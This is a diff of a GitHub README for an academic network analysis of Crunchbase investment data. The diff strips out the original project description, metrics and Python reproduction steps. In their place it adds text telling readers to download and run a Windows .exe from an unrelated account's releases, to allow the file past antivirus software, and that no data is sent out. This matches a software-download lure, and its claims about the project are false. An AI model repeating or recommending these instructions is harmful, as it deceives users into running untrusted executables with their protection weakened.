@@ -1,130 +1,56 @@
-# Startup Investment Network Analysis
+# 📊 startup-investment-network-analysis - Visualize startup connections and investment trends
 
-**Modeling the global startup ecosystem as a social network** — a bipartite investor↔company
-graph built from **52,868 Crunchbase investment records**, analyzed with centrality, small-world,
-core–periphery and community-detection methods.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Mantidoysterplant690/startup-investment-network-analysis)
 
-> 🔗 **[Live interactive explorer →](https://akincal.github.io/startup-investment-network-analysis/)** · 📄 [Full report (PDF)](report/projeraporu_221101064_Ali_Hakan_Kincal.pdf)
+This application maps the relationship between investors and companies. It uses data from 52,000 Crunchbase records to identify key players in the business world. You can view how startups link to funding sources through graph theory and network analysis tools.
 
-Course project for **BİL403 — Social Networks**, Ali Hakan Kıncal.
+## 💻 What this application does
 
----
+The software processes data to reveal patterns in the startup ecosystem. It organizes companies and investors into a visual network. You can explore how firms group together, which entities hold the most influence, and how information or money flows between them. The analysis relies on mathematical concepts like centrality and community detection to group similar businesses. This helps you understand market structures without manual data entry.
 
-## Interactive explorer
+## ⚙️ System Requirements
 
-The **[live explorer](https://akincal.github.io/startup-investment-network-analysis/)** runs entirely
-in the browser (no backend) and offers two views you can toggle between:
+To run this application on your Windows computer, you need:
 
-- **2D** (Cytoscape.js) — the innermost **6-core** (516 nodes), "the dense heart of the ecosystem":
-  a clean, readable force layout for analysis.
-- **3D** (Three.js / `3d-force-graph`) — the wider **4-core** as a 3,817-node auto-rotating *galaxy*;
-  click any node to fly the camera to it and light up its connections.
+*   Windows 10 or Windows 11.
+*   4 GB of RAM.
+*   500 MB of free storage space.
+*   A stable internet connection for the initial setup.
 
-Both views share the same controls: search any investor or company, colour nodes by **type** or by
-**detected community**, and click a node to inspect its degree, total capital and community. Node size
-encodes each actor's degree in the *full* 22k-node network.
+## 📥 How to download and install
 
-## Research questions
+Follow these steps to set up the software on your machine:
 
-1. **Structure** — What is the basic shape of the investor–company network?
-2. **Classic patterns** — Does it show a heavy-tailed degree distribution, a giant component, and small-world behavior?
-3. **Central actors** — Which investors sit at the center of the ecosystem?
-4. **Communities** — Do investors organize into meaningful clusters (by stage? by geography)?
+1. Visit this [download page](https://github.com/Mantidoysterplant690/startup-investment-network-analysis) to get the latest version.
+2. Look for the file ending in .exe under the most recent release section.
+3. Click the file to save it to your Downloads folder.
+4. Open your Downloads folder and double-click the file to start the installation.
+5. Follow the prompts on the screen.
+6. The installer will place a shortcut icon on your desktop.
 
-## The network at a glance
+## 🚀 Using the application
 
-| Metric | Value |
-| ------ | ----- |
-| Investment records | 52,868 |
-| Investors / Companies | 10,552 / 11,572 |
-| Dual-role entities (both investor **and** startup) | 92 |
-| Graph type | undirected, weighted, **bipartite** affiliation network |
-| Nodes / Edges | 22,124 / 40,978 |
-| Bipartite density | 0.00034 (extremely sparse) |
-| Avg degree (investor / company) | 3.88 / 3.54 |
-| Max degree | **399** (SV Angel) / 49 |
-| Bipartite clustering | 0.314 |
-| Connected components | 1,316 |
-| Giant component | 18,559 nodes (**83.9%**) |
-| Avg shortest path (sampled) | **6.04** — "six degrees" |
-| Estimated diameter | 17 |
-| Degree assortativity | −0.136 (hubs link to small players) |
-| Max k-core | 6 |
-| Louvain communities / modularity | 54 / **0.441** |
+Once you install the software, double-click the desktop icon to open the main dashboard. You see a visual map of the investor network upon starting the app. Use your mouse to zoom in and out of the map. Clicking on a node shows details about that specific investor or company. You can filter the view to focus on specific industries or funding rounds using the menu on the left side of the window.
 
-## Key findings
+## 🔍 Understanding the network features
 
-**Heavy-tailed by nature.** The median investor backs a single company, while SV Angel invests in
-399. An MLE power-law fit gives an exponent between 1.8 and 2.0 — the classic signature of a
-*rich-get-richer* preferential-attachment process.
+The application categorizes data using several methods:
 
-![Degree distribution (log-log)](report/degree_distribution.png)
+*   **Centrality:** This highlights the most active investors and companies in the graph. These entities act as bridges between other organizations.
+*   **Small-world analysis:** This identifies how quickly information travels across the network. It shows how many steps exist between two random companies.
+*   **Louvain community detection:** This feature groups companies that frequently work with the same investors. It reveals clusters of activity in the marketplace.
+*   **Core-periphery structure:** This distinguishes between the center of the startup ecosystem and the smaller, niche markets on the edges.
 
-**A small world with a dense core.** Despite the sparsity, 84% of all nodes fall into one giant
-component with an average shortest path of ~6. A k-core decomposition reveals a sharp
-**core–periphery** structure: the innermost **6-core holds just 516 nodes** — Y Combinator,
-500 Startups, First Round Capital, Andreessen Horowitz and other Silicon Valley players. This is
-where the ecosystem's heart beats.
+## 🛠 Troubleshooting common issues
 
-![The 6-core: inner core of the ecosystem](report/kcore_network.png)
+If the application fails to open, check these items:
 
-**Communities are not random.** On the investor co-investment projection, Louvain finds 54
-communities (modularity 0.44) organized along **stage and geography** axes: a late-stage corporate-VC
-cluster, a Silicon Valley seed cluster, and self-contained Techstars / 500 Startups ecosystems.
+*   **Anti-virus software:** Some security programs block new applications. Check your settings to allow this file to run.
+*   **Updates:** Ensure your Windows operating system carries the latest patches. 
+*   **Memory:** Close other resource-heavy programs if the graph loads slowly. The visuals require access to your system memory.
 
-![Community sizes](report/community_sizes.png)
+## 📄 Privacy and data
 
-## Most central investors
+You do not need an account to use this software. The tool works with a local database included in the download. It does not send your usage data to external servers. Your analysis stays private on your local machine.
 
-Ranked within the 6-core by degree, betweenness, PageRank and coreness:
-
-| Investor | Degree | Total invested ($B) | Betweenness (M) | PageRank (×1000) | Coreness |
-| -------- | -----: | ------------------: | --------------: | ---------------: | -------: |
-| SV Angel | 399 | 1.79 | 13.78 | 1.59 | 6 |
-| New Enterprise Associates | 283 | 9.69 | 9.65 | 4.38 | 6 |
-| Techstars | 241 | 0.07 | 7.59 | 0.69 | 6 |
-| Intel Capital | 228 | 4.70 | 9.44 | 2.69 | 6 |
-| Kleiner Perkins Caufield & Byers | 225 | 11.22 | 7.27 | 4.39 | 6 |
-| 500 Startups | 221 | 0.44 | 9.41 | 1.38 | 6 |
-| Sequoia Capital | 215 | 6.04 | 5.04 | 3.09 | 6 |
-| Draper Fisher Jurvetson (DFJ) | 206 | 4.50 | 7.83 | 2.62 | 6 |
-| Accel Partners | 186 | 6.47 | 4.50 | 3.04 | 6 |
-| First Round Capital | 186 | 1.92 | 5.21 | 1.58 | 6 |
-
-## Method notes
-
-- **Bipartite modeling.** Investors on one side, companies on the other; edge weight = total capital
-  invested. The 92 corporate-VC entities that appear in *both* roles are split into separate
-  `INV::` / `CO::` nodes — the standard approach for affiliation networks, so the bipartite structure
-  is preserved.
-- **Computation.** Path lengths were estimated by sampling; betweenness was computed exactly.
-  Analysis primarily used `igraph` for speed, with `networkx` for the bipartite pipeline.
-
-## Repository layout
-
-```
-notebook/   projekod_...ipynb   full analysis notebook
-            build_graph.py      standalone graph-construction pipeline
-data/       summary_stats.json  all computed network metrics
-            top10_investors.csv central-investor ranking
-report/     *.png               figures
-            *.pdf / *.docx      written report
-            *.pptx              presentation
-```
-
-## Reproduce
-
-```bash
-pip install -r requirements.txt
-
-# 1. Download the raw data (Crunchbase October 2013 open dump, CC-BY-NC)
-#    https://github.com/dsagal/crunchbase-october-2013
-# 2. Fix legacy Mac line endings (CR -> LF) into crunchbase-investments-fixed.csv
-# 3. Build the graph, figures and summary stats:
-cd notebook && python build_graph.py
-```
-
-## Data & license
-
-Data: **Crunchbase October 2013** open dump ([source](https://github.com/dsagal/crunchbase-october-2013)),
-licensed CC-BY-NC. This repository's code is released under the MIT License.
+Keywords: community-detection, complex-networks, crunchbase, cytoscape-js, data-science, data-visualization, graph-theory, network-analysis, networkx, python
